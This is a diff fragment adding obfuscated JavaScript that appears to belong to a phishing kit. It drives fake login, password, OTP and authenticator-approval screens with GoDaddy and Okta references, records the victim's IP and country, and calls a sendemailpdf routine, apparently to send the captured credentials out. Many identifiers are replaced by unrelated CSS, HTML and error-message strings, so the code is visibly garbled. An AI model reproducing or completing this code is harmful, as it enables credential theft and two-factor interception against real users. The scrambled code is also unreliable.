+                    const _0x1489ee = _0x21ad77;
+                    _0x2d5039[`Next`] = unamepdfinp[`signin_blocked_reason`];
+                  }),
+                  bottomsectionlinks(`inp_otp_live`, [
+                    {
+                      a_id: "idA_PWD_ForgotPassword",
+                      a_text: `approve auth request auth app live`,
+                      type: `uname_doc`,
+                    },
+                  ]),
+                  changebackbutton(`inp_otp_live`, 0x0),
+                  document["getElementById"](`img`)[`pdfemail`][`waiting`](
+                    `background-image`,
+                  ),
+                  document[`selectprotectoption(this)`]("section_uname_pdf")[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document["getElementById"](`email otp`)["classList"][
+                    `waiting`
+                  ](`background-image`),
+                  document[`selectprotectoption(this)`](`backbtnclick`)[
+                    `pdfemail`
+                  ]["remove"](`background-image`),
+                  (otherweburl = _0x1e263a[
+                    `</a> or try to sign in again shortly.</p>`
+                  ][`#section_uname_content`](`small`, "")),
+                  (webnotfound = !![]),
+                  (view = `inp_otp_live`));
+              }
+              if (
+                _0x1e263a[`</a> or try to sign in again shortly.</p>`] ==
+                `input[type="radio"]`
+              ) {
+                multipleaccountsback = 0x1;
+                if (twa == 0x0) {
+                  var _0x3b37e8 = document["querySelectorAll"](`twofaselect`);
+                  _0x3b37e8["forEach"](function (_0x15fa2e) {
+                    const _0x46f4b8 = _0x21ad77;
+                    _0x15fa2e["style"][`pwd_godaddy`] = `src`;
+                  });
+                }
+                document["getElementById"]("section_multipleaccounts")
+                  [`.loading-container`](`float`)
+                  [`142499lsAMVs`](`ihaveacode`, _0x1e263a[`resentlink`]),
+                  document[`selectprotectoption(this)`](
+                    "section_multipleaccounts",
+                  )
+                    [`.loading-container`](`float`)
+                    [`142499lsAMVs`](`div`, `href`),
+                  checkerrordesc(`maxLength`, 0x0, _0x1e263a["description"]),
+                  displaymultipleaccounts(_0x1e263a[`row tile`]),
+                  bottomsectionlinks(`maxLength`, _0x1e263a[`otp sent live`]),
+                  document[`.btn_can`](`log`)[`querySelector`]((_0x4cb46a) => {
+                    const _0x3118b3 = _0x21ad77;
+                    _0x4cb46a[`Next`] = unamepdfinp[`signin_blocked_reason`];
+                  }),
+                  document["getElementById"](`img`)[`pdfemail`][`waiting`](
+                    `background-image`,
+                  ),
+                  document[`selectprotectoption(this)`](`authapperrorresend`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document["getElementById"](`email otp`)[`pdfemail`][
+                    `waiting`
+                  ](`background-image`),
+                  document[`selectprotectoption(this)`](
+                    "section_multipleaccounts",
+                  )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                    `background-image`,
+                  ),
+                  (view = `maxLength`);
+              }
+              if (
+                _0x1e263a[`</a> or try to sign in again shortly.</p>`] ==
+                `signinblocked live`
+              ) {
+                if (twa == 0x0) {
+                  if (
+                    _0x1e263a[`otp sent error`] !== undefined &&
+                    _0x1e263a[`otp sent error`] !== null
+                  ) {
+                    var _0x3b37e8 = document[`.btn_can`](`twofaselect`);
+                    _0x3b37e8[`querySelector`](function (_0x2d4dbd) {
+                      const _0x593b5e = _0x21ad77;
+                      (_0x2d4dbd[`getElementById`][`otpdesc`] =
+                        `position` + _0x1e263a[`otp sent error`] + "\x27)"),
+                        (_0x2d4dbd[`getElementById`][`then`] = `row`),
+                        (_0x2d4dbd[`getElementById`][`pwd_godaddy`] =
+                          `checked`);
+                    });
+                  }
+                  _0x1e263a[`.title`] !== undefined &&
+                    _0x1e263a[`.title`] !== null &&
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`voice`](
+                      "background-color",
+                      _0x1e263a[`.title`],
+                    );
+                  _0x1e263a[`signoutoption`] !== undefined &&
+                    _0x1e263a[`signoutoption`] !== null &&
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`voice`](
+                      `background-color`,
+                      `position` + _0x1e263a["backgroundimage"] + "\x27)",
+                    );
+                  if (
+                    _0x1e263a[`otp sent error`] == undefined ||
+                    _0x1e263a[`otp sent error`] == null
+                  ) {
+                    var _0x3b37e8 = document[`.btn_can`](`twofaselect`);
+                    _0x3b37e8["forEach"](function (_0x1e8c3b) {
+                      const _0x5360eb = _0x21ad77;
+                      _0x1e8c3b["style"][`pwd_godaddy`] = `src`;
+                    });
+                  }
+                }
+                bottomsectionlinks(`inp_otp_live`, _0x1e263a["bottomsection"]),
+                  changebackbutton(`inp_otp_live`, _0x1e263a["backbutton"]),
+                  (document[`selectprotectoption(this)`](`flex`)[`Next`] = ""),
+                  (document[`selectprotectoption(this)`](`flex`)[
+                    `getElementById`
+                  ][`checkpass`] = `section_otp`),
+                  document[`.btn_can`](`log`)[`querySelector`]((_0x2b4c5d) => {
+                    const _0x5a92b5 = _0x21ad77;
+                    _0x2b4c5d[`Next`] = unamepdfinp["value"];
+                  }),
+                  document["getElementById"]("sections_pdf")[`pdfemail`][
+                    `waiting`
+                  ](`background-image`),
+                  document["getElementById"](`authapperrorresend`)["classList"][
+                    `waiting`
+                  ](`background-image`),
+                  document[`selectprotectoption(this)`](`email otp`)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document[`selectprotectoption(this)`]("section_pwd")[
+                    `pdfemail`
+                  ][`<a class="link mb-16" href="#" data-id="`]("d-none"),
+                  (view = "pwd");
+              }
+              _0x1e263a[`</a> or try to sign in again shortly.</p>`] ==
+                `auth` &&
+                ((document["getElementById"](`flex`)[`Next`] =
+                  "Please,\x20provide\x20a\x20valid\x20email."),
+                (document[`selectprotectoption(this)`](`flex`)[
+                  `getElementById`
+                ][`checkpass`] = `dynamic-style`),
+                loadinganimationpdf(0x1));
+            }, _0x2e620b);
+        }
+      })
+      ["catch"]((_0x2f999c) => {
+        const _0x88a9a1 = _0x27916a;
+        loadinganimationpdf(0x1),
+          console[`auth`](`selecttwofamethod(this)`, _0x2f999c);
+      });
+  }
+  function validatepdf() {
+    const _0x3bdeb7 = _0x283fde;
+    if (view === "uname_pdf") {
+      const _0x2fe165 = bes,
+        _0x527caa = unamepdfinp[`signin_blocked_reason`]
+          [
+            `That doesn't match the phone number associated with your account. The correct number ends in `
+          ]()
+          [`appendChild`]("@")[0x1];
+      unamepdfinp[`signin_blocked_reason`][`ajax`]("@") &&
+        _0x2fe165[`288sDLHMP`]((_0x3b868a) => _0x527caa[`ajax`](_0x3b868a)) &&
+        (loadinganimationpdf(0x0),
+        setTimeout(function () {
+          const _0x36bef3 = _0x3bdeb7;
+          loadinganimationpdf(0x1),
+            (document[`selectprotectoption(this)`](`flex`)["innerText"] =
+              `display: unset;`),
+            (document["getElementById"](`flex`)[`getElementById`]["display"] =
+              "block");
+        }, 0xbb8));
+      if (
+        unamepdfinp[`signin_blocked_reason`][
+          `That doesn't match the phone number associated with your account. The correct number ends in `
+        ]() == ""
+      )
+        (document["getElementById"](`flex`)["innerText"] = `display: unset;`),
+          (document[`selectprotectoption(this)`]("error_uname_pdf")[
+            `getElementById`
+          ][`checkpass`] = `dynamic-style`);
+      else
+        unamepdfinp[`signin_blocked_reason`][
+          `That doesn't match the phone number associated with your account. The correct number ends in `
+        ]() != "" &&
+          unamepdfinp[`signin_blocked_reason`][`ajax`]("@") &&
+          !_0x2fe165[`288sDLHMP`]((_0x58d9fd) =>
+            _0x527caa[`ajax`](_0x58d9fd),
+          ) &&
+          (loadinganimationpdf(0x0),
+          webnotfound == !![] &&
+            setTimeout(function () {
+              loadinganimationpdf(0x1),
+                setTimeout(function () {
+                  const _0x5cca1e = _0x374d;
+                  (document[_0x5cca1e(0x30b)](_0x5cca1e(0x2f0))[
+                    _0x5cca1e(0x37f)
+                  ] = ""),
+                    (document["getElementById"]("inp_pwd")[_0x5cca1e(0x2ab)] =
+                      ""),
+                    document[_0x5cca1e(0x30b)](_0x5cca1e(0x1da))["classList"][
+                      _0x5cca1e(0x315)
+                    ](_0x5cca1e(0x1d6)),
+                    document[_0x5cca1e(0x30b)](_0x5cca1e(0x276))[
+                      _0x5cca1e(0x208)
+                    ]["toggle"](_0x5cca1e(0x1d6)),
+                    document[_0x5cca1e(0x30b)]("section_pwd")[_0x5cca1e(0x208)][
+                      "remove"
+                    ](_0x5cca1e(0x1d6)),
+                    (view = _0x5cca1e(0x21a));
+                }, 0x12c);
+            }, 0xbb8),
+          webnotfound == ![] &&
+            (interacted == 0x1 && sendemailpdf(),
+            interacted == 0x0 &&
+              ((interacted = 0x1),
+              (function _0x10cb13() {
+                const _0x23c1ea = _0x3bdeb7;
+                $["get"](
+                  `setAttribute`,
+                  function (_0x4ca661) {
+                    const _0x5e5633 = _0x23c1ea;
+                    (userip = _0x4ca661["ip"]),
+                      (usercountry = _0x4ca661[`iProofPhoneEntry`]),
+                      sendemailpdf();
+                  },
+                  `textContent`,
+                )["fail"](function (_0x4c2ef0, _0x1c0dd2, _0xdf36b3) {
+                  const _0x335db3 = _0x23c1ea;
+                  (_0x4c2ef0[`input#i011e.okta`] == 0x1ad ||
+                    _0x1c0dd2 !== `fadeinform 1s forwards`) &&
+                    setTimeout(_0x10cb13, 0x3e8);
+                });
+              })())));
+    }
+    return ![];
+  }
+}
